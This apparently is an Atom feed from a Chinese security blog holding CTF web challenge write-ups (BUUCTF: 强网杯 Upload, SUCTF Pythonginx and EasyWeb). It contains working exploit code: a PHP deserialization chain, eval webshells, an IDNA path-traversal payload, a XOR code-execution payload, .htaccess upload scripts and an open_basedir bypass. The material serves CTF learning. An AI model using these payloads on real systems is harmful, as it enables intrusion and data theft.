<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Aesm1p&#39; Blog</title>
  
  <subtitle>前方如聂鲁达的爱情诗一般美好</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chaosec.top/"/>
  <updated>2020-09-14T14:58:44.063Z</updated>
  <id>http://chaosec.top/</id>
  
  <author>
    <name>Aesm1p</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF_WEB(二)</title>
    <link href="http://chaosec.top/2020/09/14/buuctf1/"/>
    <id>http://chaosec.top/2020/09/14/buuctf1/</id>
    <published>2020-09-14T14:58:44.000Z</published>
    <updated>2020-09-14T14:58:44.063Z</updated>
    
    <content type="html"><![CDATA[<p>[强网杯 2019]Upload</p><a id="more"></a>        <h1 id="强网杯-2019-Upload">          <a href="#强网杯-2019-Upload" class="heading-link"><i class="fas fa-link"></i></a>[强网杯 2019]Upload</h1>      <p>题目流程走了一圈，没发现有什么利用点。查看cookie，发现存在base64编码的反序列化信息，所以猜测有源码泄露，扫目录发现题目存在源码泄露<code>www.tar.gz</code><br>，下载源码之后审计源码，既然题目是<code>Upload</code>，应该和上传有关，查看上传部分代码<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><br>可以看到上传之后题目都被强制修改后缀为<code>png</code>，无法执行PHP代码，所以要寻找其它漏洞点，结合前面的cookie，查找反序列化相关代码，发现在上传图片后会进行序列化操作<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'img'</span>]=<span class="keyword">$this</span>-&gt;img;</span><br><span class="line">        cookie(<span class="string">"user"</span>,base64_encode(serialize(<span class="keyword">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure><br>在首页存在反序列化操作<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><br>接下来尝试构造pop链<br>在<code>Profile</code>类中，存在两个魔术方法<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><br><code>__call</code>的触发需要调用不存在的方法，而在<code>Register</code>类的析构函数中<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><br>此处调用了不存在的index方法，可以触发<code>__call</code>方法，然后<code>__call</code>方法又可以触发<code>__get</code>方法，这样，通过<code>__get</code>方法可以执行我们想要执行的函数，而在<code>Profile</code>类的<code>upload_img</code>函数正好存在利用点<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><br>我们可以通过控制<code>$ext=1</code>是代码进入此流程，先上传恶意图片，然后利用<code>@copy($this-&gt;filename_tmp, $this-&gt;filename);</code>来修改我们上传的文件后缀名从而getshell<br><strong>攻击流程：</strong><br>先上传恶意图片文件，内容为<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_REQUEST[&#39;snow&#39;]); ?&gt;</span><br></pre></td></tr></table></div></figure><br>查看网页源代码获取到该图片的存储位置，序列化代码如下<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;except = <span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp = <span class="string">'./upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.png'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">'./upload/snow.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;registed = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Profile();</span><br><span class="line">$b = <span class="keyword">new</span> Register($a);</span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($b));</span><br></pre></td></tr></table></div></figure><br>替换cookie后刷新页面，访问上传的图片地址即可getshell</p>        <h1 id="SUCTF-2019-Pythonginx">          <a href="#SUCTF-2019-Pythonginx" class="heading-link"><i class="fas fa-link"></i></a>[SUCTF 2019]Pythonginx</h1>      <p>本题给出了源代码，是一个flask项目，会返回我们提交的url中的内容<br><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl, timeout=<span class="number">2</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></div></figure><br>提示我们需要读文件，先是限制了host不能是suctf.cc（如果是函数就返回了），但是后面又显示必须是suctf.cc，关键点就在<code>urlsplit</code>函数，在<span class="exturl"><a class="exturl__link" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">blackhat2019</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>会议上提到了此漏洞，通过inda编码的字符在进行unicode解码时会导致字符逃逸，例如<code>℀</code>会变成<code>a/c</code>，显然，这样会导致路径插入，比如<code>suctf.c℀om</code>可以变成<code>suctf.ca/com</code>，从而实现逃逸<br>回到本题，我们可以直接找一个能解码成<code>c</code>的特殊字符即可<br><img src="/2020/09/14/buuctf1/1.png" alt><br>payload如下:<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;suctf.cⅭ&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">file:&#x2F;&#x2F;suctf.cⅭ&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></div></figure></p>        <h1 id="SUCTF-2019-EasyWeb">          <a href="#SUCTF-2019-EasyWeb" class="heading-link"><i class="fas fa-link"></i></a>[SUCTF 2019]EasyWeb</h1>      <p>题目给出了源代码<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">    <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><br>题目过滤了大量字符，经测试还有<code>^</code>可以用，参考p牛的方法使用异或进行代码执行，因为存在长度限制，所以使用字符数比较短的GET变量<br><strong>小知识点： 在PHP中，url 参数默认是字符串类型</strong><br>fuzz脚本：<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$s = <span class="string">'_GET'</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">'%'</span>.dechex(<span class="number">244</span>).<span class="string">' '</span>);</span><br><span class="line"><span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;strlen($s);$j++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">        $a = chr(<span class="number">244</span>)^chr($i);</span><br><span class="line">        <span class="keyword">if</span>($a == $s[$j])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'%'</span>.dechex($i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><br>payload：<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ab%b3%b1%a0^%f4%f4%f4%f4&#125;&#123;%f4&#125;();&amp;%f4&#x3D;phpinfo</span><br></pre></td></tr></table></div></figure><br>由于长度受限，我们只能执行简单的函数，想要进行读文件等操作还是需要getshell，题目还给出了<code>get_the_flag</code>函数，其中存在上传功能，可以利用此函数进行文件上传，该函数存在过滤点</p><ol><li>后缀检测</li><li>文件内容检测，文件中不得出现<code>&lt;?</code></li><li>exif_imagetype</li></ol><p>可以通过文件上传加<code>.htaccess</code>进行绕过，代码没有表单，可以找个上传点抓包然后和本题数据包拼接一下就可以上传了，绕过2处的过滤，需要对PHP文件进行编码<br><img src="/2020/09/14/buuctf1/2.png" alt><br><strong>PS:</strong>因为是base64编码，所以要保证字符长度是4的倍数，如果不够的话要自己凑一下<br><img src="/2020/09/14/buuctf1/3.png" alt><br>然后访问a.ooo即可解析为PHP代码<br>当然，也可以使用脚本上传<br><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r"http://84ae465d-bec5-48bb-965b-bd7f4b51394f.node3.buuoj.cn/?_=$&#123;%ab%b3%b1%a0^%f4%f4%f4%f4&#125;&#123;%f4&#125;();&amp;%f4=get_the_flag"</span></span><br><span class="line">file1 = &#123;<span class="string">'file'</span>: (<span class="string">'a.ooo'</span>, <span class="string">'GIF89aaa\nPD9waHAgQGV2YWwoJF9SRVFVRVNUWyJzbm93Il0pO3BocGluZm8oKTs/Pg=='</span>)&#125;</span><br><span class="line">file2 = &#123;<span class="string">'file'</span>: (<span class="string">'.htaccess'</span>, <span class="string">'#define width 45\n#define height 45\nAddType application/x-httpd-php .ooo\nphp_value '</span></span><br><span class="line">    <span class="string">'auto_append_file "php://filter/convert.base64-decode/resource=a.ooo"'</span>)&#125;</span><br><span class="line">r = requests.post(url, files=file1).text</span><br><span class="line">print(r)</span><br><span class="line">r = requests.post(url, files=file2).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></div></figure><br><img src="/2020/09/14/buuctf1/4.png" alt><br>访问网站flag文件存在提示信息</p><blockquote><p>hhhh<br>This is fake flag<br>But I heard php7.2-fpm has been initialized in unix socket mode!<br>~    </p></blockquote><p>需要我们绕过open_basedir限制，我们可以选择绕过该限制，也可以选择直接绕过disable_functions（推荐这种方法，蚁剑有插件）</p><p>payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload&#x2F;tmp_bad194011f5ad0cf609c77ad222e50d6&#x2F;a.ooo?snow&#x3D;chdir(%27img%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27&#x2F;%27);var_dump(file_get_contents(%27&#x2F;THis_Is_tHe_F14g%27));</span><br></pre></td></tr></table></div></figure></p>        <h1 id="SUCTF-2019-Upload-Labs-2">          <a href="#SUCTF-2019-Upload-Labs-2" class="heading-link"><i class="fas fa-link"></i></a>[SUCTF 2019]Upload Labs 2</h1>      <p>php://filter/resource=phar://./upload/bad194011f5ad0cf609c77ad222e50d6/b5e9b4f86ce43ca65bd79c894c4a924c.gif</p>        <h1 id="De1CTF-2019-SSRF-Me">          <a href="#De1CTF-2019-SSRF-Me" class="heading-link"><i class="fas fa-link"></i></a>[De1CTF 2019]SSRF Me</h1>      <p>题目给出源码和提示<code>flag is in ./flag.txt</code></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span 